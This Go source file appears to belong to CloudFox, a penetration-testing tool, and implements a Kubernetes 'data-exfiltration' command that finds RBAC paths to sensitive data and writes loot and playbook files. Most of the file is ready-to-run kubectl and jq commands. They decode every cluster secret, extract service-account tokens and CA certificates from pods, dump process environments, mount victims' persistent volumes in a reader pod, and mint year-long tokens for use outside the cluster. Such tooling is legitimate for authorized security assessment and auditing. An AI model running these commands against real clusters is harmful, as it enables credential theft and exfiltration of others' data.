package commands

import (
	"fmt"
	"sort"
	"strings"

	"github.com/BishopFox/cloudfox/globals"
	"github.com/BishopFox/cloudfox/internal"
	"github.com/BishopFox/cloudfox/kubernetes/sdk"
	attackpathservice "github.com/BishopFox/cloudfox/kubernetes/services/attackpathService"
	"github.com/BishopFox/cloudfox/kubernetes/shared"
	"github.com/spf13/cobra"
)

var DataExfiltrationCmd = &cobra.Command{
	Use:     "data-exfiltration",
	Aliases: []string{"exfil", "de", "data-exfil"},
	Short:   "Identify data exfiltration paths in Kubernetes",
	Long: `Analyze Kubernetes RBAC and resources to identify data exfiltration opportunities.

This module examines permissions that allow reading sensitive data from the cluster
that could be exfiltrated to external destinations.

Detected data exfiltration vectors include:

Secrets:
- Read secrets (credentials, API keys, TLS certificates)
- List secrets cluster-wide or namespace-scoped
- Full wildcard access to secrets

ConfigMaps:
- Read configmaps (often contain sensitive configuration)
- List configmaps for sensitive data discovery

Logs:
- Pod logs access (may contain sensitive data, credentials in error messages)

Data Extraction:
- Pod exec (extract files and data from containers)
- PersistentVolumeClaim access (access data volumes)

Token Exfiltration:
- ServiceAccount token generation (for external use)

Custom Resources:
- Read custom resources (may contain sensitive application data)

Usage:
  cloudfox kubernetes data-exfiltration`,
	Run: runDataExfiltrationCommand,
}

type DataExfiltrationOutput struct {
	Table []internal.TableFile
	Loot  []internal.LootFile
}

func (o DataExfiltrationOutput) TableFiles() []internal.TableFile { return o.Table }
func (o DataExfiltrationOutput) LootFiles() []internal.LootFile   { return o.Loot }

type DataExfiltrationModule struct {
	// All paths from combined analysis
	AllPaths       []attackpathservice.AttackPath
	ClusterPaths   []attackpathservice.AttackPath
	NamespacePaths map[string][]attackpathservice.AttackPath
	Namespaces     []string
}

func runDataExfiltrationCommand(cmd *cobra.Command, args []string) {
	ctx, cancel := shared.ContextWithCancel()
	defer cancel()
	logger := internal.NewLogger()

	parentCmd := cmd.Parent()
	verbosity, _ := parentCmd.PersistentFlags().GetInt("verbosity")
	wrap, _ := parentCmd.PersistentFlags().GetBool("wrap")
	outputDirectory, _ := parentCmd.PersistentFlags().GetString("outdir")
	format, _ := parentCmd.PersistentFlags().GetString("output")

	// Validate authentication first
	if err := sdk.ValidateAuth(ctx); err != nil {
		logger.ErrorM(fmt.Sprintf("Authentication failed:\n%v", err), globals.K8S_DATA_EXFIL_MODULE_NAME)
		return
	}

	logger.InfoM(fmt.Sprintf("Analyzing data exfiltration paths for %s", globals.ClusterName), globals.K8S_DATA_EXFIL_MODULE_NAME)

	// Initialize attack path service
	svc, err := attackpathservice.New()
	if err != nil {
		logger.ErrorM(fmt.Sprintf("Failed to initialize attack path service: %v", err), globals.K8S_DATA_EXFIL_MODULE_NAME)
		return
	}
	svc.SetModuleName(globals.K8S_DATA_EXFIL_MODULE_NAME)

	// Run analysis
	result, err := svc.CombinedAnalysis(ctx, "exfil")
	if err != nil {
		logger.ErrorM(fmt.Sprintf("Failed to analyze data exfiltration: %v", err), globals.K8S_DATA_EXFIL_MODULE_NAME)
		return
	}

	module := &DataExfiltrationModule{
		AllPaths:       result.AllPaths,
		ClusterPaths:   result.ClusterPaths,
		NamespacePaths: result.NamespacePaths,
		Namespaces:     result.Namespaces,
	}

	if len(module.AllPaths) == 0 {
		logger.InfoM("No data exfiltration paths found", globals.K8S_DATA_EXFIL_MODULE_NAME)
		return
	}

	// Count by scope and risk
	clusterCount := len(module.ClusterPaths)
	namespaceCount := len(module.AllPaths) - clusterCount
	riskCounts := countExfilRiskLevels(module.AllPaths)

	logger.SuccessM(fmt.Sprintf("Found %d data exfiltration path(s): %d cluster-level, %d namespace-level",
		len(module.AllPaths), clusterCount, namespaceCount), globals.K8S_DATA_EXFIL_MODULE_NAME)
	logger.InfoM(fmt.Sprintf("Risk Summary: CRITICAL=%d, HIGH=%d, MEDIUM=%d, LOW=%d",
		riskCounts.Critical, riskCounts.High, riskCounts.Medium, riskCounts.Low), globals.K8S_DATA_EXFIL_MODULE_NAME)

	// Generate output
	tables := module.buildExfilTables()
	loot := module.generateExfilLoot()

	output := DataExfiltrationOutput{
		Table: tables,
		Loot:  loot,
	}

	err = internal.HandleOutput(
		"Kubernetes",
		format,
		outputDirectory,
		verbosity,
		wrap,
		"data-exfiltration",
		globals.ClusterName,
		"results",
		output,
	)
	if err != nil {
		logger.ErrorM(fmt.Sprintf("Error writing output: %v", err), globals.K8S_DATA_EXFIL_MODULE_NAME)
		return
	}

	logger.InfoM(fmt.Sprintf("For context and next steps: https://github.com/BishopFox/cloudfox/wiki/Kubernetes-Commands#%s", globals.K8S_DATA_EXFIL_MODULE_NAME), globals.K8S_DATA_EXFIL_MODULE_NAME)
}

func (m *DataExfiltrationModule) buildExfilTables() []internal.TableFile {
	headers := []string{
		"Risk Level",
		"Source",
		"Scope",
		"Principal",
		"Principal Type",
		"Method",
		"Target Resource",
		"Permissions",
		"Role",
		"Binding",
		"Description",
	}

	var body [][]string

	// Sort by risk level (CRITICAL first)
	sortedPaths := make([]attackpathservice.AttackPath, len(m.AllPaths))
	copy(sortedPaths, m.AllPaths)
	sort.Slice(sortedPaths, func(i, j int) bool {
		return shared.RiskLevelValue(sortedPaths[i].RiskLevel) > shared.RiskLevelValue(sortedPaths[j].RiskLevel)
	})

	for _, path := range sortedPaths {
		scope := path.ScopeName
		if path.ScopeType == "cluster" {
			scope = "cluster-wide"
		}
		source := path.SourceType
		if source == "" {
			source = "core"
		}

		body = append(body, []string{
			path.RiskLevel,
			source,
			scope,
			path.Principal,
			path.PrincipalType,
			path.Method,
			path.TargetResource,
			strings.Join(path.Permissions, ", "),
			path.RoleName,
			path.BindingName,
			path.Description,
		})
	}

	return []internal.TableFile{
		{
			Name:   "DataExfiltration",
			Header: headers,
			Body:   body,
		},
	}
}

func (m *DataExfiltrationModule) generateExfilLoot() []internal.LootFile {
	var lootContent []string

	lootContent = append(lootContent, "#####################################")
	lootContent = append(lootContent, "##### Kubernetes Data Exfiltration Commands")
	lootContent = append(lootContent, "##### Generated by CloudFox")
	lootContent = append(lootContent, "#####################################")
	lootContent = append(lootContent, "")

	riskCounts := countExfilRiskLevels(m.AllPaths)
	lootContent = append(lootContent, fmt.Sprintf("# Risk Summary: CRITICAL=%d, HIGH=%d, MEDIUM=%d, LOW=%d",
		riskCounts.Critical, riskCounts.High, riskCounts.Medium, riskCounts.Low))
	lootContent = append(lootContent, "")

	// Section: Secrets
	secretPaths := filterExfilByCategory(m.AllPaths, "Secrets")
	if len(secretPaths) > 0 {
		lootContent = append(lootContent, "")
		lootContent = append(lootContent, "### SECRETS - Extract credentials, API keys, certificates")
		lootContent = append(lootContent, "")
		for _, path := range secretPaths {
			lootContent = append(lootContent, fmt.Sprintf("# [%s] %s (%s) - %s", path.RiskLevel, path.Principal, path.PrincipalType, path.ScopeName))
			lootContent = append(lootContent, fmt.Sprintf("# Role: %s via %s", path.RoleName, path.BindingName))
			lootContent = append(lootContent, path.ExploitCommand)
			lootContent = append(lootContent, "")
		}

		// Add additional secret extraction commands
		lootContent = append(lootContent, "# Additional secret extraction commands:")
		lootContent = append(lootContent, "# Decode all secrets in a namespace:")
		lootContent = append(lootContent, "kubectl get secrets -n <namespace> -o json | jq '.items[].data | map_values(@base64d)'")
		lootContent = append(lootContent, "")
		lootContent = append(lootContent, "# Find TLS certificates:")
		lootContent = append(lootContent, "kubectl get secrets -A --field-selector type=kubernetes.io/tls -o wide")
		lootContent = append(lootContent, "")
		lootContent = append(lootContent, "# Find docker registry credentials:")
		lootContent = append(lootContent, "kubectl get secrets -A --field-selector type=kubernetes.io/dockerconfigjson -o json | jq '.items[].data[\".dockerconfigjson\"]' -r | base64 -d")
		lootContent = append(lootContent, "")
	}

	// Section: ConfigMaps
	configmapPaths := filterExfilByCategory(m.AllPaths, "ConfigMaps")
	if len(configmapPaths) > 0 {
		lootContent = append(lootContent, "")
		lootContent = append(lootContent, "### CONFIGMAPS - Extract configuration data")
		lootContent = append(lootContent, "")
		for _, path := range configmapPaths {
			lootContent = append(lootContent, fmt.Sprintf("# [%s] %s (%s) - %s", path.RiskLevel, path.Principal, path.PrincipalType, path.ScopeName))
			lootContent = append(lootContent, path.ExploitCommand)
			lootContent = append(lootContent, "")
		}
	}

	// Section: Logs
	logPaths := filterExfilByCategory(m.AllPaths, "Logs")
	if len(logPaths) > 0 {
		lootContent = append(lootContent, "")
		lootContent = append(lootContent, "### LOGS - Extract pod logs (may contain sensitive data)")
		lootContent = append(lootContent, "")
		for _, path := range logPaths {
			lootContent = append(lootContent, fmt.Sprintf("# [%s] %s (%s) - %s", path.RiskLevel, path.Principal, path.PrincipalType, path.ScopeName))
			lootContent = append(lootContent, path.ExploitCommand)
			lootContent = append(lootContent, "")
		}

		// Add additional log extraction commands
		lootContent = append(lootContent, "# Search logs for sensitive patterns:")
		lootContent = append(lootContent, "kubectl logs <pod> | grep -iE '(password|secret|token|key|credential)'")
		lootContent = append(lootContent, "")
	}

	// Section: Data Extraction via Exec
	execPaths := filterExfilByCategory(m.AllPaths, "Data Extraction")
	if len(execPaths) > 0 {
		lootContent = append(lootContent, "")
		lootContent = append(lootContent, "### DATA EXTRACTION - Extract files from containers")
		lootContent = append(lootContent, "")
		for _, path := range execPaths {
			lootContent = append(lootContent, fmt.Sprintf("# [%s] %s (%s) - %s", path.RiskLevel, path.Principal, path.PrincipalType, path.ScopeName))
			lootContent = append(lootContent, path.ExploitCommand)
			lootContent = append(lootContent, "")
		}

		// Add additional data extraction commands
		lootContent = append(lootContent, "# Extract files via kubectl cp:")
		lootContent = append(lootContent, "kubectl cp <namespace>/<pod>:/path/to/file ./extracted-file")
		lootContent = append(lootContent, "")
		lootContent = append(lootContent, "# Extract environment variables:")
		lootContent = append(lootContent, "kubectl exec <pod> -n <namespace> -- env | grep -iE '(password|secret|token|key|credential|database|api)'")
		lootContent = append(lootContent, "")
		lootContent = append(lootContent, "# Extract SA token from running pod:")
		lootContent = append(lootContent, "kubectl exec <pod> -n <namespace> -- cat /var/run/secrets/kubernetes.io/serviceaccount/token")
		lootContent = append(lootContent, "")
	}

	// Section: Token Exfiltration
	tokenPaths := filterExfilByCategory(m.AllPaths, "Token Exfil")
	if len(tokenPaths) > 0 {
		lootContent = append(lootContent, "")
		lootContent = append(lootContent, "### TOKEN EXFILTRATION - Generate SA tokens for external use")
		lootContent = append(lootContent, "")
		for _, path := range tokenPaths {
			lootContent = append(lootContent, fmt.Sprintf("# [%s] %s (%s) - %s", path.RiskLevel, path.Principal, path.PrincipalType, path.ScopeName))
			lootContent = append(lootContent, path.ExploitCommand)
			lootContent = append(lootContent, "")
		}
	}

	// Section: Storage
	storagePaths := filterExfilByCategory(m.AllPaths, "Storage")
	if len(storagePaths) > 0 {
		lootContent = append(lootContent, "")
		lootContent = append(lootContent, "### STORAGE - Access persistent volume data")
		lootContent = append(lootContent, "")
		for _, path := range storagePaths {
			lootContent = append(lootContent, fmt.Sprintf("# [%s] %s (%s) - %s", path.RiskLevel, path.Principal, path.PrincipalType, path.ScopeName))
			lootContent = append(lootContent, path.ExploitCommand)
			lootContent = append(lootContent, "")
		}
	}

	// Group by namespace for targeted exfiltration
	lootContent = append(lootContent, "")
	lootContent = append(lootContent, "### GROUPED BY NAMESPACE")
	lootContent = append(lootContent, "")

	for namespace, paths := range m.NamespacePaths {
		if len(paths) > 0 {
			lootContent = append(lootContent, fmt.Sprintf("## Namespace: %s (%d paths)", namespace, len(paths)))

			// Group by category within namespace
			secretsInNs := filterExfilByCategory(paths, "Secrets")
			if len(secretsInNs) > 0 {
				lootContent = append(lootContent, fmt.Sprintf("# Secrets access: %d principals", len(secretsInNs)))
				lootContent = append(lootContent, fmt.Sprintf("kubectl get secrets -n %s -o yaml", namespace))
			}

			configmapsInNs := filterExfilByCategory(paths, "ConfigMaps")
			if len(configmapsInNs) > 0 {
				lootContent = append(lootContent, fmt.Sprintf("# ConfigMaps access: %d principals", len(configmapsInNs)))
				lootContent = append(lootContent, fmt.Sprintf("kubectl get configmaps -n %s -o yaml", namespace))
			}

			lootContent = append(lootContent, "")
		}
	}

	// Summary of high-value targets
	lootContent = append(lootContent, "")
	lootContent = append(lootContent, "### HIGH-VALUE TARGETS")
	lootContent = append(lootContent, "")
	lootContent = append(lootContent, "# Cluster-wide secret access is most dangerous:")
	clusterSecretPaths := filterExfilByCategory(m.ClusterPaths, "Secrets")
	if len(clusterSecretPaths) > 0 {
		lootContent = append(lootContent, fmt.Sprintf("# Found %d principals with cluster-wide secret access", len(clusterSecretPaths)))
		for _, path := range clusterSecretPaths {
			lootContent = append(lootContent, fmt.Sprintf("# - %s (%s) via %s", path.Principal, path.PrincipalType, path.RoleName))
		}
	} else {
		lootContent = append(lootContent, "# No cluster-wide secret access found")
	}
	lootContent = append(lootContent, "")

	// Build playbook content using centralized attackpathService function
	clusterHeader := fmt.Sprintf("Cluster: %s", globals.ClusterName)
	playbookContent := attackpathservice.GenerateExfilPlaybook(m.AllPaths, clusterHeader)

	// Fallback to legacy playbook if centralized returns empty
	if playbookContent == "" {
		methodGroups := groupExfilByMethod(m.AllPaths)
		playbookContent = m.generateExfilPlaybook(methodGroups)
	}

	return []internal.LootFile{
		{
			Name:     "DataExfiltration-Commands",
			Contents: strings.Join(lootContent, "\n"),
		},
		{
			Name:     "DataExfiltration-Playbook",
			Contents: playbookContent,
		},
	}
}

// generateExfilPlaybook creates a reference-style guide for data exfiltration organized by data type
func (m *DataExfiltrationModule) generateExfilPlaybook(methodGroups map[string][]attackpathservice.AttackPath) string {
	var content []string

	content = append(content, "#####################################")
	content = append(content, "##### Data Exfiltration Playbook")
	content = append(content, "##### Reference Guide by Data Type")
	content = append(content, "#####################################")
	content = append(content, "")

	// Secrets
	content = append(content, `
##############################################
## SECRETS
##############################################
# Extract credentials, API keys, TLS certificates, SA tokens`)
	if entities := getExfilEntitiesForMethods(methodGroups, "Secrets"); len(entities) > 0 {
		content = append(content, "# Entities with this permission:")
		for _, entity := range entities {
			content = append(content, fmt.Sprintf("#   - %s", entity))
		}
	} else {
		content = append(content, "# No entities found with secret access")
	}
	content = append(content, `
# List all secrets cluster-wide:
kubectl get secrets -A -o custom-columns='NS:.metadata.namespace,NAME:.metadata.name,TYPE:.type'

# Extract and decode ALL secrets:
kubectl get secrets -A -o json | jq -r '.items[] | "\(.metadata.namespace)/\(.metadata.name):\n\(.data | to_entries | map("  \(.key): \(.value | @base64d)") | join("\n"))"'

# Find ServiceAccount tokens:
kubectl get secrets -A -o json | jq -r '.items[] | select(.type=="kubernetes.io/service-account-token") | "\(.metadata.namespace)/\(.metadata.name): \(.data.token | @base64d)"'

# Find TLS certificates and keys:
kubectl get secrets -A --field-selector type=kubernetes.io/tls -o json | jq -r '.items[] | "\(.metadata.namespace)/\(.metadata.name):\n  cert: \(.data["tls.crt"] | @base64d | split("\n")[0])...\n  key: \(.data["tls.key"] | @base64d | split("\n")[0])..."'

# Find Docker registry credentials:
kubectl get secrets -A --field-selector type=kubernetes.io/dockerconfigjson -o json | jq -r '.items[] | "\(.metadata.namespace)/\(.metadata.name): \(.data[".dockerconfigjson"] | @base64d)"'

# Find Opaque secrets (often contain passwords):
kubectl get secrets -A --field-selector type=Opaque -o json | jq -r '.items[] | "\(.metadata.namespace)/\(.metadata.name): \(.data | map_values(@base64d))"'

# Search secrets for specific patterns:
kubectl get secrets -A -o json | jq -r '.items[].data | to_entries[] | "\(.key): \(.value | @base64d)"' | grep -iE '(password|token|key|secret|credential)'`)

	// ConfigMaps
	content = append(content, `

##############################################
## CONFIGMAPS
##############################################
# Extract configuration files, connection strings, environment variables`)
	if entities := getExfilEntitiesForMethods(methodGroups, "ConfigMaps", "Config Access"); len(entities) > 0 {
		content = append(content, "# Entities with this permission:")
		for _, entity := range entities {
			content = append(content, fmt.Sprintf("#   - %s", entity))
		}
	} else {
		content = append(content, "# No entities found with configmap access")
	}
	content = append(content, `
# List all configmaps:
kubectl get configmaps -A -o custom-columns='NS:.metadata.namespace,NAME:.metadata.name'

# Extract all configmap data:
kubectl get configmaps -A -o json | jq -r '.items[] | "\(.metadata.namespace)/\(.metadata.name):\n\(.data | to_entries | map("  \(.key): \(.value[:100])...") | join("\n"))"'

# Search configmaps for sensitive data:
kubectl get configmaps -A -o json | jq -r '.items[].data | to_entries[] | "\(.key): \(.value)"' | grep -iE '(password|secret|token|key|database|connection|jdbc|redis|mongo)'

# Find kubeconfig files in configmaps:
kubectl get configmaps -A -o json | jq -r '.items[] | select(.data | to_entries[] | .value | contains("apiVersion: v1") and contains("clusters:")) | "\(.metadata.namespace)/\(.metadata.name)"'`)

	// Pod Logs
	content = append(content, `

##############################################
## POD LOGS
##############################################
# Extract sensitive data from application logs`)
	if entities := getExfilEntitiesForMethods(methodGroups, "Logs"); len(entities) > 0 {
		content = append(content, "# Entities with this permission:")
		for _, entity := range entities {
			content = append(content, fmt.Sprintf("#   - %s", entity))
		}
	} else {
		content = append(content, "# No entities found with log access")
	}
	content = append(content, `
# Get logs from all pods in a namespace:
for pod in $(kubectl get pods -n NAMESPACE -o name); do echo "=== $pod ==="; kubectl logs $pod -n NAMESPACE --all-containers 2>/dev/null | head -100; done

# Search logs for sensitive patterns:
kubectl logs POD_NAME -n NAMESPACE --all-containers | grep -iE '(password|secret|token|key|credential|error|exception|failed)'

# Get previous container logs (after crash):
kubectl logs POD_NAME -n NAMESPACE --previous

# Stream logs with timestamps:
kubectl logs -f POD_NAME -n NAMESPACE --timestamps

# Get logs from all containers in all pods:
kubectl get pods -A -o jsonpath='{range .items[*]}{.metadata.namespace}{" "}{.metadata.name}{"\n"}{end}' | while read ns pod; do echo "=== $ns/$pod ==="; kubectl logs $pod -n $ns --all-containers 2>/dev/null | grep -iE '(password|secret|token|api.key)' | head -10; done`)

	// Pod Exec / Data Extraction
	content = append(content, `

##############################################
## POD EXEC / DATA EXTRACTION
##############################################
# Execute commands in containers to extract files and data`)
	if entities := getExfilEntitiesForMethods(methodGroups, "Data Extraction", "Etcd Access"); len(entities) > 0 {
		content = append(content, "# Entities with this permission:")
		for _, entity := range entities {
			content = append(content, fmt.Sprintf("#   - %s", entity))
		}
	} else {
		content = append(content, "# No entities found with exec permissions")
	}
	content = append(content, `
# Extract environment variables (often contain secrets):
kubectl exec POD_NAME -n NAMESPACE -- env | sort

# Extract SA token from inside container:
kubectl exec POD_NAME -n NAMESPACE -- cat /var/run/secrets/kubernetes.io/serviceaccount/token

# Extract CA cert and namespace:
kubectl exec POD_NAME -n NAMESPACE -- cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt
kubectl exec POD_NAME -n NAMESPACE -- cat /var/run/secrets/kubernetes.io/serviceaccount/namespace

# Copy files from container:
kubectl cp NAMESPACE/POD_NAME:/path/to/file ./local-file

# Find and extract sensitive files:
kubectl exec POD_NAME -n NAMESPACE -- find / -name "*.key" -o -name "*.pem" -o -name "*.env" -o -name "*config*" 2>/dev/null
kubectl exec POD_NAME -n NAMESPACE -- cat /app/.env 2>/dev/null

# Extract database connection from common locations:
kubectl exec POD_NAME -n NAMESPACE -- cat /app/config/database.yml 2>/dev/null
kubectl exec POD_NAME -n NAMESPACE -- cat /etc/mysql/my.cnf 2>/dev/null

# Dump process memory for secrets:
kubectl exec POD_NAME -n NAMESPACE -- cat /proc/1/environ | tr '\0' '\n'`)

	// Storage / PVC
	content = append(content, `

##############################################
## STORAGE / PERSISTENT VOLUMES
##############################################
# Access data stored in persistent volumes`)
	if entities := getExfilEntitiesForMethods(methodGroups, "Storage"); len(entities) > 0 {
		content = append(content, "# Entities with this permission:")
		for _, entity := range entities {
			content = append(content, fmt.Sprintf("#   - %s", entity))
		}
	} else {
		content = append(content, "# No entities found with storage access")
	}
	content = append(content, `
# List all PVCs:
kubectl get pvc -A -o custom-columns='NS:.metadata.namespace,NAME:.metadata.name,VOLUME:.spec.volumeName,STORAGECLASS:.spec.storageClassName'

# Find PVCs bound to interesting PVs:
kubectl get pv -o json | jq -r '.items[] | select(.spec.hostPath != null) | "\(.metadata.name): hostPath=\(.spec.hostPath.path)"'

# Create a pod to mount and read PVC data:
cat <<'EOF' | kubectl apply -f -
apiVersion: v1
kind: Pod
metadata:
  name: pvc-reader
  namespace: TARGET_NAMESPACE
spec:
  containers:
  - name: reader
    image: alpine
    command: ["sleep", "3600"]
    volumeMounts:
    - name: data
      mountPath: /data
  volumes:
  - name: data
    persistentVolumeClaim:
      claimName: TARGET_PVC_NAME
EOF

# Then exec in and browse:
kubectl exec -it pvc-reader -n TARGET_NAMESPACE -- ls -la /data
kubectl exec -it pvc-reader -n TARGET_NAMESPACE -- find /data -type f -name "*.sql" -o -name "*.dump" -o -name "*.bak"`)

	// Token Generation
	content = append(content, `

##############################################
## TOKEN GENERATION
##############################################
# Generate SA tokens for use outside the cluster`)
	if entities := getExfilEntitiesForMethods(methodGroups, "Token Exfil"); len(entities) > 0 {
		content = append(content, "# Entities with this permission:")
		for _, entity := range entities {
			content = append(content, fmt.Sprintf("#   - %s", entity))
		}
	} else {
		content = append(content, "# No entities found with token generation permissions")
	}
	content = append(content, `
# Generate token for a service account:
kubectl create token SA_NAME -n NAMESPACE

# Generate long-lived token (1 year):
kubectl create token SA_NAME -n NAMESPACE --duration=8760h

# Generate token with specific audience:
kubectl create token SA_NAME -n NAMESPACE --audience=https://my-service.example.com

# Use generated token externally:
TOKEN=$(kubectl create token SA_NAME -n NAMESPACE)
curl -sk -H "Authorization: Bearer $TOKEN" https://KUBERNETES_API/api/v1/namespaces`)

	// CRD Secrets (cert-manager, external-secrets, vault)
	content = append(content, `

##############################################
## CRD-BASED SECRETS
##############################################
# Extract secrets from cert-manager, external-secrets, vault, etc.`)
	if entities := getExfilEntitiesForMethods(methodGroups, "CRD Secrets (Certs)", "CRD Secrets (ExtSecrets)", "CRD Secrets (CSI)", "CRD Secrets (Vault)"); len(entities) > 0 {
		content = append(content, "# Entities with this permission:")
		for _, entity := range entities {
			content = append(content, fmt.Sprintf("#   - %s", entity))
		}
	} else {
		content = append(content, "# No entities found with CRD secrets access")
	}
	content = append(content, `
# cert-manager - List certificates:
kubectl get certificates -A -o wide
kubectl get certificates -A -o json | jq -r '.items[] | "\(.metadata.namespace)/\(.metadata.name): secret=\(.spec.secretName)"'

# cert-manager - Extract certificate and key from secret:
kubectl get secret CERT_SECRET -n NAMESPACE -o json | jq -r '.data["tls.crt"]' | base64 -d
kubectl get secret CERT_SECRET -n NAMESPACE -o json | jq -r '.data["tls.key"]' | base64 -d

# external-secrets - List ExternalSecrets:
kubectl get externalsecrets -A -o wide
kubectl get externalsecrets -A -o json | jq -r '.items[] | "\(.metadata.namespace)/\(.metadata.name): target=\(.spec.target.name)"'

# external-secrets - View SecretStore configs (may reveal cloud credentials):
kubectl get secretstores -A -o yaml
kubectl get clustersecretstores -o yaml

# Vault - List VaultAuth configs:
kubectl get vaultauths -A -o yaml
kubectl get vaultconnections -A -o yaml

# secrets-store-csi - List SecretProviderClasses:
kubectl get secretproviderclasses -A -o yaml`)

	// Custom Resources
	content = append(content, `

##############################################
## CUSTOM RESOURCES
##############################################
# Extract sensitive data from application-specific CRDs`)
	if entities := getExfilEntitiesForMethods(methodGroups, "Custom Resources"); len(entities) > 0 {
		content = append(content, "# Entities with this permission:")
		for _, entity := range entities {
			content = append(content, fmt.Sprintf("#   - %s", entity))
		}
	} else {
		content = append(content, "# No entities found with custom resource access")
	}
	content = append(content, `
# List all CRDs in the cluster:
kubectl get crds -o custom-columns='NAME:.metadata.name,GROUP:.spec.group'

# Find CRDs that might contain sensitive data:
kubectl get crds -o name | xargs -I{} kubectl get {} -A -o yaml 2>/dev/null | grep -iE '(password|secret|token|key|credential)' | head -50

# Common sensitive CRDs to check:
kubectl get sealedsecrets -A -o yaml 2>/dev/null          # Bitnami Sealed Secrets
kubectl get externalsecrets -A -o yaml 2>/dev/null       # External Secrets Operator
kubectl get secretclaims -A -o yaml 2>/dev/null          # Crossplane
kubectl get databaseclusters -A -o yaml 2>/dev/null      # Database operators`)

	return strings.Join(content, "\n")
}

// groupExfilByMethod groups paths by their Method field
func groupExfilByMethod(paths []attackpathservice.AttackPath) map[string][]attackpathservice.AttackPath {
	groups := make(map[string][]attackpathservice.AttackPath)
	for _, path := range paths {
		groups[path.Method] = append(groups[path.Method], path)
	}
	return groups
}

// getExfilEntitiesForMethods returns unique entities that have any of the specified methods
func getExfilEntitiesForMethods(methodGroups map[string][]attackpathservice.AttackPath, methods ...string) []string {
	seen := make(map[string]bool)
	var entities []string

	for _, method := range methods {
		if paths, ok := methodGroups[method]; ok {
			for _, path := range paths {
				key := fmt.Sprintf("%s:%s", path.PrincipalType, path.Principal)
				if !seen[key] {
					seen[key] = true
					entities = append(entities, fmt.Sprintf("%s (%s) - %s", path.Principal, path.PrincipalType, path.ScopeName))
				}
			}
		}
	}

	return entities
}

// Helper functions

func countExfilRiskLevels(paths []attackpathservice.AttackPath) *shared.RiskCounts {
	counts := shared.NewRiskCounts()
	for _, path := range paths {
		counts.Add(path.RiskLevel)
	}
	return counts
}

func filterExfilByCategory(paths []attackpathservice.AttackPath, category string) []attackpathservice.AttackPath {
	var filtered []attackpathservice.AttackPath
	for _, path := range paths {
		if path.Category == category {
			filtered = append(filtered, path)
		}
	}
	return filtered
}
